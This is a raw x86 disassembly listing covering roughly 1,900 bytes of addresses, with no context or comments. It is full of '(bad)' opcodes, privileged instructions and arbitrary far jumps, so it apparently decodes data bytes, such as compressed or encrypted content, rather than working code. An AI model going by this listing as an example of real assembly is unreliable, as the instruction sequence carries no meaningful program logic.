  43e73d:	into   
  43e73e:	lods   eax,DWORD PTR ds:[esi]
  43e73f:	or     eax,0x87d16a17
  43e744:	es call 0xa09c1894
  43e74a:	mov    ah,BYTE PTR [edi-0x105bb1fb]
  43e750:	and    DWORD PTR [edx+0x41a362ef],edi
  43e756:	pop    es
  43e757:	mov    cl,0x70
  43e759:	sub    ch,bh
  43e75b:	push   eax
  43e75c:	rol    DWORD PTR [esi],cl
  43e75e:	pop    ss
  43e75f:	cli    
  43e760:	lods   eax,DWORD PTR ds:[esi]
  43e761:	push   edx
  43e762:	jle    0x43e7b2
  43e764:	cmp    al,0xf0
  43e766:	invd   
  43e768:	xor    ebx,esi
  43e76a:	pop    ecx
  43e76b:	fst    QWORD PTR [ecx+0xa]
  43e76e:	inc    esi
  43e76f:	test   DWORD PTR [edi+0x1962f4b5],edi
  43e775:	(bad)  
  43e776:	in     al,dx
  43e777:	aam    0xdf
  43e779:	pop    ebp
  43e77a:	mov    cl,0x3a
  43e77c:	(bad)  
  43e77d:	in     eax,0xbd
  43e77f:	sbb    ch,dl
  43e781:	dec    esp
  43e782:	clc    
  43e783:	adc    ecx,DWORD PTR [eax+ebp*2+0x4faf0f56]
  43e78a:	mov    cl,BYTE PTR [eax+0x62c6a7a8]
  43e790:	mov    ch,0x91
  43e792:	(bad)  
  43e794:	cmp    al,0x67
  43e796:	jo     0x43e7f8
  43e798:	icebp  
  43e799:	dec    ecx
  43e79a:	cli    
  43e79b:	sbb    BYTE PTR [edx-0x5f],ch
  43e79e:	lock and DWORD PTR [ecx-0x5d],edx
  43e7a2:	sbb    eax,0xe7dccd2
  43e7a7:	popa   
  43e7a8:	add    eax,0x45603102
  43e7ad:	out    dx,al
  43e7ae:	pop    edx
  43e7af:	or     ecx,DWORD PTR [edi]
  43e7b1:	jae    0x43e787
  43e7b3:	pop    ss
  43e7b4:	xor    DWORD PTR [ebx],ebx
  43e7b6:	inc    edx
  43e7b7:	add    eax,0xad754bab
  43e7bc:	or     ch,BYTE PTR [edi+0x15]
  43e7bf:	cld    
  43e7c0:	pop    eax
  43e7c1:	imul   edi,DWORD PTR [esi],0x858bab2f
  43e7c7:	xor    eax,0xbecfd4cf
  43e7cc:	adc    DWORD PTR [edi+0x4b],edx
  43e7cf:	xchg   ebx,eax
  43e7d0:	loope  0x43e759
  43e7d2:	int    0x1e
  43e7d4:	mov    edi,DWORD PTR [esi+0xb]
  43e7d7:	addr16 inc ecx
  43e7d9:	add    BYTE PTR [edi+0xc],dl
  43e7dc:	bound  edi,QWORD PTR [ebx+0x52]
  43e7df:	push   edi
  43e7e0:	mov    ecx,0x5b3898f6
  43e7e5:	cwde   
  43e7e6:	ret    0xbd13
  43e7e9:	pop    esp
  43e7ea:	and    al,0x5f
  43e7ec:	je     0x43e78c
  43e7ee:	push   0xfffffff9
  43e7f0:	xlat   BYTE PTR ds:[ebx]
  43e7f1:	inc    edx
  43e7f2:	add    edx,DWORD PTR [ebx+ecx*8-0x65]
  43e7f6:	test   eax,0xa73578f9
  43e7fb:	repz push ecx
  43e7fd:	sub    eax,0x7c2c86ab
  43e802:	sub    ah,al
  43e804:	sahf   
  43e805:	retf   0xe193
  43e808:	scas   eax,DWORD PTR es:[edi]
  43e809:	enter  0xc4be,0xf1
  43e80d:	push   ebp
  43e80e:	ret    0xb9a8
  43e811:	sub    edi,edi
  43e813:	imul   esi,esp,0x61
  43e816:	dec    DWORD PTR [esi+edi*2+0x4e]
  43e81a:	test   DWORD PTR [ebx-0x3615702],esp
  43e820:	sar    BYTE PTR [esi+0x1c686cb],cl
  43e826:	dec    edi
  43e827:	cwde   
  43e828:	stc    
  43e829:	xor    eax,0x4224607b
  43e82e:	add    DWORD PTR [esi-0x35],ebp
  43e831:	xor    ebp,DWORD PTR [ebx]
  43e833:	sbb    BYTE PTR ds:0x17eef0c7,dl
  43e839:	mov    cl,0x59
  43e83b:	in     eax,dx
  43e83c:	xor    al,0xa2
  43e83e:	stos   BYTE PTR es:[edi],al
  43e83f:	fcom   DWORD PTR [edi]
  43e841:	(bad)  
  43e842:	aam    0x90
  43e844:	je     0x43e871
  43e846:	and    cl,ah
  43e848:	push   eax
  43e849:	push   edx
  43e84a:	sbb    BYTE PTR [ecx+0x47],ah
  43e84d:	add    ah,BYTE PTR [esi-0x4ce3eae1]
  43e853:	push   esp
  43e854:	imul   ebx,DWORD PTR [eax],0xbb928bd
  43e85a:	loop   0x43e828
  43e85c:	jmp    0xb7baf09c
  43e861:	repnz sub bh,BYTE PTR [ecx+0x5a11c2c1]
  43e868:	adc    al,0xb4
  43e86a:	(bad)  
  43e86b:	pusha  
  43e86c:	sub    DWORD PTR [esi],edx
  43e86e:	fwait
  43e86f:	pop    ecx
  43e870:	ret    0xe55d
  43e873:	xlat   BYTE PTR ds:[ebx]
  43e874:	das    
  43e875:	add    dl,ch
  43e877:	stos   DWORD PTR es:[edi],eax
  43e878:	xchg   esp,eax
  43e879:	into   
  43e87a:	call   0xef34:0x9747ad8d
  43e881:	adc    dh,dl
  43e883:	add    DWORD PTR [esp+edx*2+0x65],eax
  43e887:	sub    BYTE PTR ds:0x809f5cb3,dl
  43e88d:	fwait
  43e88e:	push   ss
  43e88f:	xchg   ecx,eax
  43e890:	imul   eax,DWORD PTR cs:[edi+0x642930d6],0x5bc3d531
  43e89b:	and    dh,BYTE PTR ss:[edi]
  43e89e:	in     al,dx
  43e89f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43e8a0:	cmp    dl,BYTE PTR [esi]
  43e8a2:	inc    esp
  43e8a3:	ret    
  43e8a4:	jg     0x43e8f1
  43e8a6:	mov    cl,0x4e
  43e8a8:	jne    0x43e86d
  43e8aa:	pop    es
  43e8ab:	lods   al,BYTE PTR ds:[esi]
  43e8ac:	sbb    al,0x15
  43e8ae:	shr    BYTE PTR [edi+0x26ee3cfa],cl
  43e8b4:	stos   DWORD PTR es:[edi],eax
  43e8b5:	pusha  
  43e8b6:	pop    edi
  43e8b7:	fild   DWORD PTR [eax-0x6c]
  43e8ba:	shl    BYTE PTR [edi+0x2c2a1d54],cl
  43e8c0:	sar    eax,cl
  43e8c2:	or     DWORD PTR [edi-0x1b4e4cd],eax
  43e8c8:	mov    cs,WORD PTR [ebx-0x58877825]
  43e8ce:	sub    DWORD PTR [eax+0x1e3df3b7],edx
  43e8d4:	pop    ss
  43e8d5:	or     eax,0x29e4eaa9
  43e8da:	or     eax,DWORD PTR [ebx+ebp*2-0x39b4085c]
  43e8e1:	(bad)  
  43e8e2:	iret   
  43e8e3:	imul   ecx,DWORD PTR [edx-0x530defc1],0x5c
  43e8ea:	mov    eax,ds:0x759fbbb
  43e8ef:	xchg   esp,eax
  43e8f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43e8f1:	in     al,0x60
  43e8f3:	je     0x43e967
  43e8f5:	mov    cl,dh
  43e8f7:	jno    0x43e921
  43e8f9:	(bad)  [ecx+0x28]
  43e8fc:	mov    ebp,0x84759388
  43e901:	lock jecxz 0x43e93d
  43e904:	inc    ebx
  43e905:	pusha  
  43e906:	lahf   
  43e907:	or     BYTE PTR [eax],0x22
  43e90a:	push   ebp
  43e90b:	and    eax,0xa12771f9
  43e910:	jmp    0xf778:0xc3826c79
  43e917:	pop    ds
  43e918:	pushf  
  43e919:	adc    al,0xe3
  43e91b:	sbb    eax,0xfe077c3c
  43e920:	lds    eax,FWORD PTR [edx]
  43e922:	mov    ds,WORD PTR [esi+0x44477f30]
  43e928:	les    esi,FWORD PTR [edx+0x70]
  43e92b:	(bad)  
  43e92c:	mov    ecx,0x67485dd2
  43e931:	push   ebp
  43e932:	call   0xff07:0xd6d1c5d5
  43e939:	rcl    cl,cl
  43e93b:	leave  
  43e93c:	sbb    al,0x91
  43e93e:	or     al,0xeb
  43e940:	or     DWORD PTR [ebx+0x28],edi
  43e943:	mov    ah,0xfa
  43e945:	cmp    eax,ebp
  43e947:	mov    ds:0x163f69c5,eax
  43e94c:	push   edi
  43e94d:	scas   al,BYTE PTR es:[edi]
  43e94e:	icebp  
  43e94f:	sub    eax,0x8661bbf7
  43e954:	pop    ebp
  43e955:	stc    
  43e956:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43e957:	add    al,0x97
  43e959:	xlat   BYTE PTR ds:[ebx]
  43e95a:	bound  edi,QWORD PTR [ebx-0x48]
  43e95d:	dec    eax
  43e95e:	inc    edi
  43e95f:	hlt    
  43e960:	sub    BYTE PTR [ecx],bl
  43e962:	fisubr WORD PTR [edi]
  43e964:	outs   dx,BYTE PTR ds:[esi]
  43e965:	retf   
  43e966:	push   ebp
  43e967:	mov    edi,eax
  43e969:	popf   
  43e96a:	jmp    0x43e979
  43e96c:	and    al,0xe4
  43e96e:	test   eax,0x55aa7da7
  43e973:	sbb    al,0xac
  43e975:	(bad)  
  43e976:	mov    fs,WORD PTR [ebx+edx*1]
  43e979:	(bad)  
  43e97a:	mov    bh,0xf
  43e97c:	or     eax,0x14b02a32
  43e981:	iret   
  43e982:	push   esi
  43e983:	mov    ds:0xc6cb0ac1,eax
  43e988:	pusha  
  43e989:	(bad)  
  43e98a:	fcomip st,st(3)
  43e98c:	inc    ebx
  43e98d:	arpl   WORD PTR [edx+edx*2],bx
  43e990:	fmul   DWORD PTR [ebx+0x758b5444]
  43e996:	adc    BYTE PTR [eax],dl
  43e998:	mov    eax,0xf8bd01d3
  43e99d:	jb     0x43e954
  43e99f:	int    0x77
  43e9a1:	mov    ch,0xaa
  43e9a3:	push   ebp
  43e9a4:	push   ebx
  43e9a5:	push   0x19cfec36
  43e9aa:	mov    ds:0xb41df7a4,al
  43e9af:	fs xchg esi,eax
  43e9b1:	mov    esp,0x203e2ff3
  43e9b6:	and    eax,0xf8a4c441
  43e9bb:	stos   DWORD PTR es:[edi],eax
  43e9bc:	int3   
  43e9bd:	mov    eax,ds:0x5dd9496f
  43e9c2:	lods   al,BYTE PTR ds:[esi]
  43e9c3:	inc    ebp
  43e9c4:	jge    0x43e9ca
  43e9c6:	mov    ebx,0xadda7100
  43e9cb:	xchg   esp,eax
  43e9cc:	repz bound esp,QWORD PTR [ecx+ebx*4]
  43e9d0:	ja     0x43e9e4
  43e9d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43e9d3:	jbe    0x43e9fd
  43e9d5:	mov    ch,bh
  43e9d7:	cwde   
  43e9d8:	mov    dh,0xb7
  43e9da:	cwde   
  43e9db:	push   ebx
  43e9dc:	jmp    0x1543:0x3aca2a97
  43e9e3:	test   al,0x0
  43e9e5:	inc    bx
  43e9e7:	jb     0x43e96c
  43e9e9:	dec    eax
  43e9ea:	push   edi
  43e9eb:	ins    BYTE PTR es:[edi],dx
  43e9ec:	loopne 0x43ea1c
  43e9ee:	mov    esi,0x67a012d6
  43e9f3:	jns    0x43ea10
  43e9f5:	shl    DWORD PTR [eax-0x746719e2],1
  43e9fb:	stc    
  43e9fc:	dec    edx
  43e9fd:	fild   QWORD PTR [esi]
  43e9ff:	jne    0x43e9a9
  43ea01:	jns    0x43e9b5
  43ea03:	(bad)  
  43ea05:	pcmpgtw mm1,QWORD PTR [ebx]
  43ea08:	sub    al,0xd
  43ea0a:	mov    ebp,0x8450a486
  43ea0f:	jo     0x43ea3c
  43ea11:	mov    bh,0x25
  43ea13:	push   es
  43ea14:	dec    ebp
  43ea15:	enter  0x454a,0xb6
  43ea19:	fs idiv eax
  43ea1c:	sbb    edi,esi
  43ea1e:	idiv   BYTE PTR [ebp+0x1d]
  43ea21:	(bad)  
  43ea22:	jge    0x43ea43
  43ea24:	xchg   ebx,eax
  43ea25:	inc    esi
  43ea26:	and    al,0xa
  43ea28:	iret   
  43ea29:	xchg   ebp,eax
  43ea2a:	jbe    0x43ea9b
  43ea2c:	add    bh,cl
  43ea2e:	inc    esi
  43ea2f:	rcr    BYTE PTR [eax-0x36],1
  43ea32:	int3   
  43ea33:	mov    dh,dl
  43ea35:	pushf  
  43ea36:	cmp    eax,0xece0f1a9
  43ea3b:	push   eax
  43ea3c:	inc    edi
  43ea3d:	fwait
  43ea3e:	push   ebx
  43ea3f:	int    0xf
  43ea41:	call   0xa86ece7e
  43ea46:	adc    BYTE PTR [ebp+0x53953afd],al
  43ea4c:	and    DWORD PTR [esi],eax
  43ea4e:	push   0x30
  43ea50:	loop   0x43ea5d
  43ea52:	loope  0x43eab5
  43ea54:	call   eax
  43ea56:	push   esi
  43ea57:	daa    
  43ea58:	shl    DWORD PTR ds:0xd2611c37,1
  43ea5e:	loopne 0x43eac4
  43ea60:	jle    0x43ea6f
  43ea62:	push   ebp
  43ea63:	xor    dh,BYTE PTR [edi-0x5cb161b6]
  43ea69:	push   ebp
  43ea6a:	pop    ebp
  43ea6b:	leave  
  43ea6c:	les    ecx,FWORD PTR [edx-0x5a]
  43ea6f:	pop    ebx
  43ea70:	cmp    BYTE PTR [ebx],dh
  43ea72:	jo     0x43eada
  43ea74:	cmp    BYTE PTR [ecx-0x5f],0x8
  43ea78:	mov    ebp,DWORD PTR [esi-0x493b4e49]
  43ea7e:	shl    BYTE PTR [esi],cl
  43ea80:	shl    DWORD PTR [ecx+0x2fe47733],0x3a
  43ea87:	jns    0x43ea10
  43ea89:	inc    eax
  43ea8a:	mov    ecx,0xa3785933
  43ea8f:	cli    
  43ea90:	or     esp,DWORD PTR [edi-0x1]
  43ea93:	adc    eax,0x8425ae76
  43ea98:	mov    ecx,0x6eab4ba5
  43ea9d:	(bad)  
  43ea9e:	push   ebx
  43ea9f:	xchg   esp,eax
  43eaa0:	inc    ebx
  43eaa1:	mov    dh,0x89
  43eaa3:	jg     0x43ea4f
  43eaa5:	sbb    DWORD PTR [ebx-0x41],0xba396e26
  43eaac:	and    DWORD PTR [ecx],0x35
  43eaaf:	shl    DWORD PTR [ebp+0x3844fe92],1
  43eab5:	aad    0xd2
  43eab7:	push   ebx
  43eab8:	popf   
  43eab9:	dec    esi
  43eaba:	adc    bh,dh
  43eabc:	mov    gs,eax
  43eabe:	mov    al,ds:0xce497a23
  43eac3:	adc    DWORD PTR [edi+eax*4],esp
  43eac6:	xor    BYTE PTR [ecx-0xe],dl
  43eac9:	sub    ebx,ebx
  43eacb:	aad    0x22
  43eacd:	add    BYTE PTR [esi-0x561000e6],bh
  43ead3:	push   0xecf6a888
  43ead8:	call   0x93b7:0x7bbab38f
  43eadf:	or     eax,0xbd0b0a1a
  43eae4:	add    DWORD PTR [eax],edx
  43eae6:	mov    edi,0xe68d88ce
  43eaeb:	sub    ecx,ebp
  43eaed:	lods   al,BYTE PTR ds:[esi]
  43eaee:	int    0x81
  43eaf0:	fcomp  QWORD PTR [ecx]
  43eaf2:	push   0xffffffa6
  43eaf4:	sar    BYTE PTR [edi],1
  43eaf6:	mov    eax,DWORD PTR [edx-0x7c]
  43eaf9:	mov    al,0xf3
  43eafb:	mov    ah,BYTE PTR [esi]
  43eafd:	xchg   ebp,eax
  43eafe:	xchg   ebx,eax
  43eaff:	test   BYTE PTR [ebp+0x45],dl
  43eb02:	xchg   esi,eax
  43eb03:	inc    esi
  43eb04:	idiv   DWORD PTR [edx]
  43eb06:	adc    DWORD PTR gs:[esi+0x580f07a3],0xefe18a45
  43eb11:	call   eax
  43eb13:	sbb    eax,0xed180761
  43eb18:	mov    bh,BYTE PTR [ebx]
  43eb1a:	retf   
  43eb1b:	mov    ecx,0xadda8293
  43eb20:	test   eax,0x70277d8f
  43eb25:	mov    ebx,0x79197438
  43eb2a:	pop    ds
  43eb2b:	jo     0x43eaf0
  43eb2d:	or     dh,BYTE PTR [eax]
  43eb2f:	cmp    eax,0x7ae93532
  43eb34:	stc    
  43eb35:	push   edi
  43eb36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43eb37:	cmp    edx,DWORD PTR es:[edx-0x45]
  43eb3b:	clc    
  43eb3c:	and    al,0x5c
  43eb3e:	xchg   esp,eax
  43eb3f:	nop
  43eb40:	(bad)  
  43eb41:	pop    ebx
  43eb42:	jno    0x43eadc
  43eb44:	and    BYTE PTR [ebp-0x506266c],0x9f
  43eb4b:	(bad)  
  43eb4c:	les    esi,FWORD PTR [esi]
  43eb4e:	fiadd  DWORD PTR [edx+0x24]
  43eb51:	mov    ah,BYTE PTR [ebp-0x8]
  43eb54:	sub    BYTE PTR [edx],cl
  43eb56:	cmp    bl,BYTE PTR [ebp-0x20ecf8ae]
  43eb5c:	sbb    dl,dl
  43eb5e:	loop   0x43eb59
  43eb60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43eb61:	test   al,0x10
  43eb63:	inc    ecx
  43eb64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43eb65:	sbb    BYTE PTR [ebx-0xf],dh
  43eb68:	dec    esp
  43eb69:	mov    ch,0xb
  43eb6b:	dec    ebx
  43eb6c:	fwait
  43eb6d:	leave  
  43eb6e:	mov    ah,0x87
  43eb70:	push   0xfffffff3
  43eb72:	in     al,0xf3
  43eb74:	lock mov bh,0x53
  43eb77:	lods   al,BYTE PTR ds:[esi]
  43eb78:	push   ebx
  43eb79:	test   eax,0x832f5bf8
  43eb7e:	retf   
  43eb7f:	cwde   
  43eb80:	(bad)
  43eb84:	fistp  WORD PTR [ecx]
  43eb86:	jmp    0xe0d7:0xad46a776
  43eb8d:	add    DWORD PTR [ebx+0x4d],ecx
  43eb90:	inc    ebx
  43eb91:	xchg   ebx,esi
  43eb93:	cmp    eax,0xe27422e7
  43eb98:	hlt    
  43eb99:	cmp    DWORD PTR [edx-0x3dc8088],ebp
  43eb9f:	xchg   edi,eax
  43eba0:	cmp    DWORD PTR [esi+0x28072d28],0x3b158f90
  43ebaa:	fldcw  WORD PTR [esi+0x5a]
  43ebad:	mov    al,ds:0xa589bd16
  43ebb2:	(bad)  
  43ebb3:	cmp    edx,DWORD PTR [ebx+0x42]
  43ebb6:	fsub   QWORD PTR ds:0xe0f239f0
  43ebbc:	bound  edx,QWORD PTR [esi-0x54e94661]
  43ebc2:	rcr    BYTE PTR [edx],cl
  43ebc4:	int    0x2e
  43ebc6:	xchg   ecx,eax
  43ebc7:	sub    bh,BYTE PTR [ebx+0x6760653e]
  43ebcd:	mov    ebx,0xfe858ac
  43ebd2:	ins    DWORD PTR es:[edi],dx
  43ebd3:	push   eax
  43ebd4:	jbe    0x43eb97
  43ebd6:	adc    al,0xe6
  43ebd8:	sbb    al,0xda
  43ebda:	cwde   
  43ebdb:	push   ebp
  43ebdc:	push   ecx
  43ebdd:	mov    WORD PTR [eax+0x62e61d34],es
  43ebe3:	rcl    DWORD PTR [ebx],0x28
  43ebe6:	sbb    eax,0xdb36627d
  43ebeb:	dec    esp
  43ebec:	sub    ah,al
  43ebee:	add    ebx,DWORD PTR [edi]
  43ebf0:	les    edi,FWORD PTR [ebx+0x2ffab0f0]
  43ebf6:	in     al,dx
  43ebf7:	xor    eax,0xdfc5c7e5
  43ebfc:	inc    esi
  43ebfd:	in     al,0xd3
  43ebff:	lahf   
  43ec00:	xchg   esp,eax
  43ec01:	jo     0x43ec45
  43ec03:	mov    es,edi
  43ec05:	xchg   esi,eax
  43ec06:	ret    0x3066
  43ec09:	xchg   ebx,eax
  43ec0a:	pop    ebx
  43ec0b:	js     0x43ec3a
  43ec0d:	aam    0x7b
  43ec0f:	mov    edi,0xe6790554
  43ec14:	ss mov ebp,0x1bb78af4
  43ec1a:	das    
  43ec1b:	mov    ecx,0xe0ff8ae1
  43ec20:	cs push eax
  43ec22:	dec    ecx
  43ec23:	pop    esp
  43ec24:	xchg   ebx,eax
  43ec25:	and    DWORD PTR [ebx],edx
  43ec27:	(bad)  
  43ec28:	ror    DWORD PTR [esi+esi*1+0x73],0xd1
  43ec2d:	jns    0x43ec5a
  43ec2f:	cmp    DWORD PTR [edx],edx
  43ec31:	or     ah,dl
  43ec33:	ss pop es
  43ec35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43ec36:	jge    0x43ec2d
  43ec38:	add    dl,BYTE PTR [edi]
  43ec3a:	jp     0x43ec47
  43ec3c:	out    dx,eax
  43ec3d:	js     0x43ebf4
  43ec3f:	inc    eax
  43ec40:	call   0x4032:0xf37ff2a4
  43ec47:	adc    eax,0x7c20ab00
  43ec4c:	(bad)  
  43ec4d:	jmp    0x37d39528
  43ec52:	test   eax,0x97da6cf6
  43ec57:	inc    edi
  43ec58:	push   ebp
  43ec59:	and    al,0x47
  43ec5b:	cmp    eax,0x58dfa8f9
  43ec60:	shr    cl,1
  43ec62:	ss pusha 
  43ec64:	cmp    DWORD PTR [edx-0x78],0x6b
  43ec68:	xchg   edx,eax
  43ec69:	lods   al,BYTE PTR ds:[esi]
  43ec6a:	outs   dx,DWORD PTR ds:[esi]
  43ec6b:	xor    ecx,DWORD PTR [ebx-0x1fc8ce36]
  43ec71:	adc    DWORD PTR [ecx-0x74619b93],ebp
  43ec77:	bound  edx,QWORD PTR [edx+esi*1]
  43ec7a:	jecxz  0x43ec81
  43ec7c:	inc    ebp
  43ec7d:	pop    esi
  43ec7e:	repnz xchg ecx,eax
  43ec80:	xor    ecx,DWORD PTR [ecx-0x5416ed9e]
  43ec86:	aas    
  43ec87:	jno    0x43eca2
  43ec89:	adc    al,0xd7
  43ec8b:	or     DWORD PTR [esi-0x68],edi
  43ec8e:	xor    al,0x6b
  43ec90:	mov    ds:0x6ee22b3f,eax
  43ec95:	js     0x43ece7
  43ec97:	mov    al,ds:0xaeebbc29
  43ec9c:	add    edx,DWORD PTR [edx]
  43ec9e:	cmp    ch,BYTE PTR [ebx+ebp*8-0x37]
  43eca2:	inc    ebx
  43eca3:	mov    cl,0x35
  43eca5:	icebp  
  43eca6:	sub    BYTE PTR [ebx-0x2f39ccdc],cl
  43ecac:	test   DWORD PTR [esp+edi*8+0x73b8b019],ebp
  43ecb3:	dec    ebx
  43ecb4:	(bad)  
  43ecb5:	leave  
  43ecb6:	daa    
  43ecb7:	add    ch,BYTE PTR [esi-0x382fb81a]
  43ecbd:	out    dx,eax
  43ecbe:	test   al,0xab
  43ecc0:	fimul  DWORD PTR [ebp+0x2ccc96fa]
  43ecc6:	gs jmp 0xb209:0xf2583ec6
  43ecce:	cmc    
  43eccf:	pop    ebp
  43ecd0:	pop    edx
  43ecd1:	popa   
  43ecd2:	and    eax,DWORD PTR [eax+0x64553c0a]
  43ecd8:	dec    eax
  43ecd9:	xchg   ebx,eax
  43ecda:	push   ss
  43ecdb:	mov    esi,DWORD PTR [ebx+0x598da332]
  43ece1:	inc    ebx
  43ece2:	pop    ecx
  43ece3:	retf   0xef92
  43ece6:	(bad)  
  43ece8:	jl     0x43ecce
  43ecea:	pop    edi
  43eceb:	adc    BYTE PTR [eax],ch
  43eced:	stos   BYTE PTR es:[edi],al
  43ecee:	shl    esp,1
  43ecf0:	push   0xffffffb4
  43ecf2:	cli    
  43ecf3:	xchg   edx,eax
  43ecf4:	ficom  WORD PTR [edi-0x4ad1e8d0]
  43ecfa:	pop    edi
  43ecfb:	sub    DWORD PTR [ebx-0x6e],edx
  43ecfe:	jo     0x43ed6d
  43ed00:	add    BYTE PTR [ebx-0x250a34ab],0xb8
  43ed07:	add    eax,0xd1338b55
  43ed0c:	in     eax,dx
  43ed0d:	xor    BYTE PTR [ebx-0x2afdeaa2],0xa3
  43ed14:	mov    bh,0x5
  43ed16:	push   ss
  43ed17:	jo     0x43ecd7
  43ed19:	outs   dx,BYTE PTR ds:[esi]
  43ed1a:	cld    
  43ed1b:	xchg   ebp,eax
  43ed1c:	pop    ecx
  43ed1d:	dec    ecx
  43ed1e:	fisubr WORD PTR [edx-0x6]
  43ed21:	jecxz  0x43ed9f
  43ed23:	mov    eax,0xc297c1e8
  43ed28:	imul   eax,DWORD PTR [edx+0x26],0x14ebd7d9
  43ed2f:	ins    BYTE PTR es:[edi],dx
  43ed30:	jmp    DWORD PTR [eax-0x57]
  43ed33:	out    0xec,eax
  43ed35:	mov    ah,0xc2
  43ed37:	lods   eax,DWORD PTR ds:[esi]
  43ed38:	ja     0x43ecca
  43ed3a:	jnp    0x43ed01
  43ed3c:	in     al,0x45
  43ed3e:	fwait
  43ed3f:	rcl    edi,cl
  43ed41:	stos   BYTE PTR es:[edi],al
  43ed42:	loop   0x43ed99
  43ed44:	ja     0x43edb3
  43ed46:	mov    ecx,0x1f066234
  43ed4b:	or     edx,DWORD PTR [eax+0x6]
  43ed4e:	add    al,0x17
  43ed50:	out    0x1f,al
  43ed52:	out    0x7f,al
  43ed54:	add    eax,0x2f2f03ac
  43ed59:	js     0x43edc3
  43ed5b:	jecxz  0x43ed62
  43ed5d:	jne    0x43edb2
  43ed5f:	dec    esp
  43ed60:	xchg   edi,eax
  43ed61:	das    
  43ed62:	mov    esi,0xb523d25a
  43ed67:	add    dl,BYTE PTR [ebx-0x57e81234]
  43ed6d:	out    0xe5,eax
  43ed6f:	(bad)  
  43ed70:	call   0x1f5b:0xe9774049
  43ed77:	aaa    
  43ed78:	add    dh,al
  43ed7a:	test   DWORD PTR [edx+0x35],eax
  43ed7d:	popa   
  43ed7e:	(bad)  
  43ed7f:	mov    eax,ds:0xf31dc989
  43ed84:	push   0x2c
  43ed86:	in     eax,0xa
  43ed88:	adc    al,BYTE PTR [eax+0x796f7a15]
  43ed8e:	mov    al,ds:0xa6c1068a
  43ed93:	ja     0x43ed2d
  43ed95:	jne    0x43ed1b
  43ed97:	and    BYTE PTR [edx],ch
  43ed99:	daa    
  43ed9a:	xor    dh,BYTE PTR [ecx-0x70]
  43ed9d:	xor    al,0x1f
  43ed9f:	test   DWORD PTR [edx],0x23cf1c08
  43eda5:	lods   eax,DWORD PTR ds:[esi]
  43eda6:	mov    ecx,DWORD PTR [edi]
  43eda8:	call   0xc90b:0xdb887b89
  43edaf:	(bad)  
  43edb1:	push   ebx
  43edb2:	sbb    DWORD PTR [edi-0x12dbc661],0x2
  43edb9:	pop    ss
  43edba:	sbb    ah,bl
  43edbc:	outs   dx,BYTE PTR ds:[esi]
  43edbd:	test   DWORD PTR [edx+eax*2+0x164c8564],edi
  43edc4:	jmp    0x1a6b:0x47dc8600
  43edcb:	imul   edi,DWORD PTR [ebp-0x52414ef1],0xffffff94
  43edd2:	bound  esi,QWORD PTR [eax-0x78]
  43edd5:	pop    es
  43edd6:	jno    0x43ee2e
  43edd8:	pop    ebx
  43edd9:	and    cl,bl
  43eddb:	push   edx
  43eddc:	xchg   ch,bl
  43edde:	and    dl,BYTE PTR [edx-0x12e00307]
  43ede4:	xor    al,0x4f
  43ede6:	add    eax,0xffd804cb
  43edeb:	loopne 0x43ed96
  43eded:	mov    cl,0x39
  43edef:	inc    edx
  43edf0:	fs (bad) 
  43edf2:	iret   
  43edf3:	enter  0x60e7,0x12
  43edf7:	dec    DWORD PTR gs:[edx-0x19]
  43edfb:	xchg   edx,eax
  43edfc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43edfd:	jb     0x43edde
  43edff:	jo     0x43ede3
  43ee01:	jecxz  0x43edd2
  43ee03:	arpl   WORD PTR ds:0x39942c21,dx
  43ee09:	ficomp DWORD PTR [esi]
  43ee0b:	pop    edi
  43ee0c:	mov    edx,0x7ccd414a
  43ee11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43ee12:	pop    ecx
  43ee13:	adc    bl,BYTE PTR [ecx]
  43ee15:	jge    0x43edda
  43ee17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43ee18:	mov    ch,0x6
  43ee1a:	mov    cl,0x1e
  43ee1c:	cmp    eax,0x5d8e9667
  43ee21:	(bad)  
  43ee22:	(bad)  
  43ee23:	fild   QWORD PTR [ebp+0xd]
  43ee26:	cwde   
  43ee27:	inc    edx
  43ee28:	adc    al,0x75
  43ee2a:	sbb    ah,BYTE PTR [ecx+ebp*4+0xa]
  43ee2e:	push   ebp
  43ee2f:	adc    cl,BYTE PTR [eax-0x5a9a4d9]
  43ee35:	inc    edx
  43ee36:	inc    esp
  43ee37:	cs dec ebx
  43ee39:	inc    ebp
  43ee3a:	adc    ch,ah
  43ee3c:	test   BYTE PTR [ebx+edi*4-0x4be7e756],0x12
  43ee44:	aad    0xe0
  43ee46:	pop    edi
  43ee47:	clc    
  43ee48:	pusha  
  43ee49:	imul   eax,DWORD PTR [ecx-0x7ead79a7],0x69cad8e6
  43ee53:	ret    0x2919
  43ee56:	sbb    al,0x88
  43ee58:	jle    0x43ee19
  43ee5a:	jae    0x43eecd
  43ee5c:	adc    cl,BYTE PTR [eax+0x1ac9726d]
  43ee62:	mov    bl,0x65
  43ee64:	rcl    BYTE PTR [edx+0x41cb66ce],cl
  43ee6a:	mov    BYTE PTR [ebp-0x17efeeaf],ch
  43ee70:	test   al,0x46
  43ee72:	daa    
  43ee73:	add    al,0x60
  43ee75:	cmc    
  43ee76:	xchg   ebp,eax
  43ee77:	shl    esp,0xa7
  43ee7a:	je     0x43ee66
  43ee7c:	jmp    0x45e1:0xa9d155c1
  43ee83:	adc    ch,BYTE PTR [eax-0x4b]
  43ee86:	push   ss
  43ee87:	mov    al,0x24
  43ee89:	inc    eax
  43ee8a:	(bad)
  43ee8d:	xchg   ebx,eax
  43ee8e:	(bad)  
  43ee8f:	lock scas al,BYTE PTR es:[edi]
  43ee91:	nop
  43ee92:	mov    cl,0x5a
  43ee94:	data16 adc BYTE PTR [edi-0x26],bh
  43ee98:	xchg   edx,eax
  43ee99:	retf   0x5ba4
  43ee9c:	push   0xffffffd1
  43ee9e:	push   ebp
  43ee9f:	fdiv   QWORD PTR [ecx+ebx*2]
  43eea2:	jl     0x43ef21
  43eea4:	outs   dx,BYTE PTR ds:[esi]
  43eea5:	or     ah,0xa
